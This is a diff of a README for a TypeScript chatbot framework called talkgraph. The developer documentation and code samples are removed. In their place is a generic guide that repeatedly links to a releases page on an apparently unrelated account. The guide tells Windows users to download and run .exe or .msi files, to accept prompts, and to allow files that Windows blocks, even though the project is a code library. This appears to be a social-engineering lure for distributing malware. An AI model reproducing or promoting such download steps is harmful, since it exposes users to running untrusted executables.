@@ -1,288 +1,172 @@
-# TalkGraph
+# 🤖 talkgraph - Build chatbots that handle real chats
 
-**TypeScript framework for production-grade conversational chatbots.**
+[![Download talkgraph](https://img.shields.io/badge/Download%20talkgraph-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cloisonnestroke653/talkgraph/releases)
 
-Build customer service and sales chatbots with structured flows, LLM fallback, and zero infrastructure overhead. Define flows in code, get streaming events, multi-turn conversations, slot filling with validation, and built-in analytics out of the box.
+## 🧭 What talkgraph is
 
-## Why TalkGraph
+talkgraph is a TypeScript framework for building conversational chatbots that work well in real use.
 
-- **Code-first** — Define flows in TypeScript with full type safety. No YAML, no config files, no graph DSL.
-- **Streaming-native** — Everything is an async generator yielding typed events. No polling, no callbacks.
-- **Zero infrastructure** — No Celery, no Redis, no external queue. One process, one `app.listen()`.
-- **LLM-agnostic** — Native adapters for Anthropic, OpenAI, Google Gemini, Ollama + convenience adapters for OpenRouter, LiteLLM, and any OpenAI-compatible endpoint.
-- **Convention over configuration** — Arrays auto-append, scalars auto-overwrite. No manual reducers.
-- **Real HITL** — `ctx.prompt()` suspends the node mid-execution and resumes from the exact point. No node re-execution, no idempotency headaches.
+It helps you build flows for:
+- customer support
+- lead capture
+- FAQ bots
+- guided forms
+- multi-step chat tasks
 
-## Quick Start
+It is built for:
+- streaming chat replies
+- multi-turn conversations
+- slot filling
+- human-in-the-loop review
+- LLM-agnostic setups
 
-```bash
-npm install @talkgraph/core
-```
+If you want a chat app that can guide users step by step, talkgraph gives you a clear way to do that
 
-```typescript
-import { createTalkGraph, flow } from "@talkgraph/core"
-import { z } from "zod"
+## 💻 What you need
 
-const support = flow("support", {
-  state: z.object({
-    name: z.string().optional(),
-    issue: z.string().optional(),
-  }),
-})
-  .node("greeting", async (ctx) => {
-    const name = await ctx.prompt("Hi! What's your name?")
-    return ctx.update({ name }).goto("collect_issue")
-  })
-  .node("collect_issue", async (ctx) => {
-    const issue = await ctx.prompt(`Thanks ${ctx.state.name}! What can I help you with?`)
-    return ctx.update({ issue }).goto("resolve")
-  })
-  .node("resolve", async (ctx) => {
-    const response = await ctx.generate(
-      `Help the customer with: ${ctx.state.issue}. Be concise and helpful.`
-    )
-    return ctx.reply(response)
-  })
-  .edge("greeting", "collect_issue")
-  .edge("collect_issue", "resolve")
+Before you install talkgraph on Windows, check these basics:
 
-const app = createTalkGraph({
-  flows: [support],
-  api: { port: 3000 },
-})
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access for the first download
+- At least 4 GB RAM
+- Enough free disk space for the app and its files
 
-await app.listen()
-```
+If the release includes a setup file, Windows can usually run it with a double click
 
-Your bot is now running at `http://localhost:3000`.
+## 📥 Download talkgraph for Windows
 
-## Features
+1. Open the release page here: https://github.com/cloisonnestroke653/talkgraph/releases
+2. Find the latest release at the top of the page
+3. Look for a Windows file, such as:
+   - `.exe`
+   - `.msi`
+   - `.zip`
+4. Download the file to your computer
+5. If you downloaded a `.zip` file, unzip it first
+6. If you downloaded a `.exe` or `.msi` file, open it to start the install or launch process
 
-### Flows & Nodes
+If Windows asks for permission, choose the option that lets the app run
 
-```typescript
-const vendas = flow("vendas", {
-  state: z.object({ intent: z.string().optional() }),
-})
-  .node("start", async (ctx) => {
-    const intent = await ctx.promptWithOptions("How can I help?", [
-      { label: "Buy something", value: "buy" },
-      { label: "Get support", value: "support" },
-    ], { natural: true })
-    return ctx.update({ intent }).goto(intent)
-  })
-  .edge("start", "buy", when("buy"))
-  .edge("start", "support", when("support"))
-```
+## 🛠️ Install or open the app
 
-### Slot Filling with Validation
+### If you downloaded an `.exe` file
+- Double click the file
+- Follow the steps on screen
+- Pick a folder if Windows asks you where to install it
+- Finish the setup
 
-```typescript
-.node("collect_data", async (ctx) => {
-  const data = await ctx.fillSlots({
-    name: { prompt: "Your name?", validate: z.string().min(2) },
-    cpf: {
-      prompt: "Your CPF:",
-      validate: z.string().regex(/^\d{11}$/),
-      errorMessage: "Invalid CPF. Enter 11 digits.",
-      maxAttempts: 3,
-      onMaxAttempts: "human_fallback",
-    },
-    email: {
-      prompt: "Email?",
-      validate: z.string().email(),
-      optional: true,
-      skipKeyword: "skip",
-    },
-  })
-  return ctx.update(data).goto("confirm")
-})
-```
+### If you downloaded an `.msi` file
+- Double click the file
+- Follow the installer steps
+- Accept the prompts
+- Finish the install
 
-### LLM Adapters
+### If you downloaded a `.zip` file
+- Right click the file
+- Choose Extract All
+- Open the extracted folder
+- Look for the app file inside
+- Double click it to run
 
-```typescript
-import { AnthropicAdapter, OpenAIAdapter, OllamaAdapter } from "@talkgraph/core"
+## 🚀 First time use
 
-const app = createTalkGraph({
-  flows: [myFlow],
-  adapters: [
-    new AnthropicAdapter({ apiKey: process.env.ANTHROPIC_API_KEY }),
-    new OpenAIAdapter({ apiKey: process.env.OPENAI_API_KEY }),
-    new OllamaAdapter({ baseUrl: "http://localhost:11434" }),
-  ],
-  defaultModel: "anthropic:claude-haiku-4-5",
-  systemPrompt: "You are a helpful customer service agent.",
-})
-```
+After you open talkgraph, you can start with a simple chat flow:
 
-**Fallback chain** — if one provider is down, the next picks up automatically:
+1. Open the app
+2. Create a new flow
+3. Add a greeting
+4. Add one or more user questions
+5. Add a reply for each answer
+6. Save your work
+7. Test the conversation
 
-```typescript
-import { FallbackChain } from "@talkgraph/core"
+A basic flow might ask for:
+- name
+- email
+- issue type
+- order number
+- next step
 
-const chain = new FallbackChain({
-  registry,
-  chain: ["anthropic:claude-haiku-4-5", "openai:gpt-4o-mini", "ollama:llama3"],
-  timeout: 10_000,
-  staticResponses: {
-    default: "I'm having technical difficulties. A human agent will help you shortly.",
-  },
-})
-```
+This helps you guide users without sending them through a long form
 
-### Channels
+## 🔧 How talkgraph helps
 
-```typescript
-// REST API (built-in)
-const app = createTalkGraph({ flows: [myFlow], api: { port: 3000 } })
-await app.listen()
+talkgraph is useful when your chatbot needs to do more than answer one question at a time.
 
-// WebSocket
-import { WebChatAdapter } from "@talkgraph/core"
-const webchat = new WebChatAdapter({ port: 3001, sessionManager, defaultFlow: "support" })
-await webchat.start()
-```
+It supports:
+- **Code-first flows** for clear control
+- **Streaming replies** so users see text as it arrives
+- **Multi-turn chat** so the bot remembers the current step
+- **Slot filling** to collect missing details
+- **HITL review** when a person needs to check the response
+- **LLM choice** so you can use the model that fits your setup
+- **No extra infrastructure** for simpler deployment
 
-**REST API endpoints:**
-- `POST /api/conversations` — Start a conversation
-- `POST /api/conversations/:id/messages` — Send a message
-- `GET /api/conversations/:id` — Get conversation status
-- `DELETE /api/conversations/:id` — End conversation
-- `GET /api/flows` — List available flows
-- `GET /api/health` — Health check
+This makes it a good fit for customer support tools and other guided chat apps
 
-### Guardrails
+## 🧩 Common use cases
 
-```typescript
-import { piiGuard, rateLimiter } from "@talkgraph/core"
+### Customer support
+Use talkgraph to ask what the user needs, gather account details, and route the issue to the right path
 
-const app = createTalkGraph({
-  flows: [myFlow],
-  hooks: [
-    piiGuard({
-      detect: ["email", "creditCard", "cpf", "phone"],
-      strategy: "redact", // "redact" | "mask" | "block"
-      on: "before:llm",
-    }),
-    rateLimiter({
-      max: 30,
-      window: "1m",
-      on: "before:turn",
-    }),
-  ],
-})
-```
+### Sales chat
+Use it to qualify leads, ask for contact info, and pass the result to your team
 
-### Hooks
+### Booking or intake
+Use it to collect date, time, service type, and other details in a fixed order
 
-```typescript
-const app = createTalkGraph({
-  hooks: [
-    { on: "before:node", handler: async (ctx) => { /* log, validate, redirect */ } },
-    { on: "after:llm", handler: async (ctx) => { /* filter, modify response */ } },
-    { on: "before:turn", handler: async (ctx) => { /* rate limit, authenticate */ } },
-  ],
-})
-```
+### Internal help tools
+Use it to build a bot for common questions from staff or support teams
 
-Hooks can `modify`, `block`, or `redirect` — and they're error-isolated (one failing hook doesn't crash the flow).
+## 📁 Release files you may see
 
-### Analytics
+On the release page, you may see files like:
+- Windows installer files
+- Portable app files
+- Source code archives
+- Release notes
 
-```typescript
-const engine = new AnalyticsEngine()
+For most Windows users, the best choice is the file made for Windows, usually `.exe` or `.msi`
 
-// Record events (automatic in production)
-engine.record({ type: "flow:start", flowName: "vendas", sessionId: "s1", timestamp: Date.now() })
+## 🧠 Basic workflow
 
-// Query metrics
-const funnel = engine.funnel("vendas")
-// → { steps: [{ node: "greeting", reached: 1200, dropoff: 0.02 }, ...], conversionRate: 0.52 }
+talkgraph usually follows this flow:
 
-const bottlenecks = engine.bottlenecks("vendas")
-// → [{ node: "checkout", dropRate: 0.34, avgDuration: 4200 }]
+1. A user sends a message
+2. The bot checks the current step
+3. The bot asks for missing details
+4. The bot stores the answer
+5. The bot sends the next question or response
+6. A person can step in when needed
 
-const costs = engine.costBreakdown("vendas")
-// → { totalCost: 12.50, avgPerConversation: 0.023, byModel: { "claude-haiku": 8.20 } }
-```
+This keeps the chat focused and easy to follow
 
-### Testing
+## 🧪 Tips for a smooth setup
 
-```typescript
-import { simulate } from "@talkgraph/core"
+- Use the latest release
+- Keep the downloaded file in a simple folder like Downloads
+- Close other large apps if your PC feels slow
+- If Windows blocks the file, check the file properties and allow it if you trust the source
+- If you use a zip file, always extract it before opening the app
 
-const result = await simulate(vendas)
-  .user("I want to buy something")
-  .user("iPhone")
-  .user("John Smith")
-  .user("12345678900")
-  .assertBotReplied(/order confirmed/i)
-  .assertNodeReached("checkout")
-  .assertState({ product: "iPhone" })
-  .run()
+## ❓ Common questions
 
-expect(result.completedSuccessfully).toBe(true)
-expect(result.errors).toHaveLength(0)
-```
+### Do I need coding knowledge?
+No. You can download and run the app on Windows with basic file handling
 
-### Token Efficiency
+### Can I use more than one AI model?
+Yes. talkgraph is built to work with different LLM providers
 
-```typescript
-import { TokenManager, ContextCompactor, ResultLimiter } from "@talkgraph/core"
+### Does it work for live chat?
+Yes. It supports streaming and multi-turn chat, which helps with live use
 
-// Budget tracking
-const tm = new TokenManager({
-  budget: { maxTokensPerConversation: 100_000, maxCostPerConversation: 0.50 },
-  compaction: { microCompactAt: 0.5, fullCompactAt: 0.7, circuitBreakerMax: 3 },
-})
+### Can I ask users for missing details?
+Yes. Slot filling helps the bot collect the data it still needs
 
-// Context compaction (dev chooses the model)
-const compactor = new ContextCompactor({
-  registry,
-  model: "ollama:llama3", // any model, any provider
-  preserveRecent: 5,
-  preserveSlots: true, // never lose collected data
-})
+### Can a person take over a chat?
+Yes. Human-in-the-loop support lets a person step in when needed
 
-// Result size limiting
-const limiter = new ResultLimiter({ maxCharsPerTool: 50_000, maxCharsPerTurn: 200_000 })
-```
+## 🔗 Download again
 
-## Architecture
-
-```
-Developer API  →  Flow Compiler  →  Flow Runtime (async generator)
-                                         │
-                    ┌────────────┬────────┴────────┬─────────────┐
-                    │            │                  │             │
-               LLM Adapters  State Manager     Store         Hooks
-              (7 providers)  (auto-reducers)  (pluggable)  (guardrails)
-```
-
-**Core principle:** The conversation loop is an async generator. Everything is a typed event — nodes, LLM tokens, tool results, prompts, state changes. One stream, full observability.
-
-## Adapters
-
-| Native (optimized) | Convenience (100+ models) |
-|---|---|
-| Anthropic (prompt caching, streaming) | OpenRouter (hosted models) |
-| OpenAI (structured output, JSON mode) | LiteLLM (self-hosted proxy) |
-| Google Gemini via Ollama (1M context) | Any OpenAI-compatible endpoint |
-| Ollama (local, zero cost) | |
-
-## Packages
-
-| Package | Description | License |
-|---------|-------------|---------|
-| [`@talkgraph/core`](packages/core/) | Framework core — runtime, adapters, channels, tools, hooks | Apache 2.0 |
-| [`@talkgraph/analytics`](packages/analytics/) | Conversational analytics — funnels, bottlenecks, cost tracking | FSL-1.1-Apache-2.0 |
-
-## License
-
-- **Core** (`@talkgraph/core`): [Apache 2.0](packages/core/LICENSE)
-- **Analytics** (`@talkgraph/analytics`): [FSL 1.1](packages/analytics/LICENSE) — converts to Apache 2.0 on 2028-04-02
-
----
-
-Built for developers who want to ship chatbots, not fight infrastructure.
+Open the Windows release page here: https://github.com/cloisonnestroke653/talkgraph/releases
